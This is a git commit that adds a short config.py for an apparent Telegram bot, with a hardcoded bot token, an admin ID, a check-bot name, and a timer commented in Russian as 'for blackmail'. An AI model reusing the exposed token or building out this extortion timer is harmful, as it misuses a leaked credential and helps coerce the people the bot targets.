8335e82addae53ee97e895922aac131d55d3f35e
sttandofac-svg <sttandofac@gmail.com>
2026-04-02 19:38:34 +0400

    Create config.py

---
+++ config.py
@@ -0,0 +1,7 @@
+TOKEN = "8620419935:AAHsA2Gkmi82NRGUWQ8XZTw5ExSKOilar78"  # основной бот
+CHECK_BOT = "StarsNymerCheckBot"  # для инлайн-чеков
+
+ADMIN_ID = 7489815425
+
+# Для шантажа
+THREAT_TIME = 900  # 15 минут в секундах
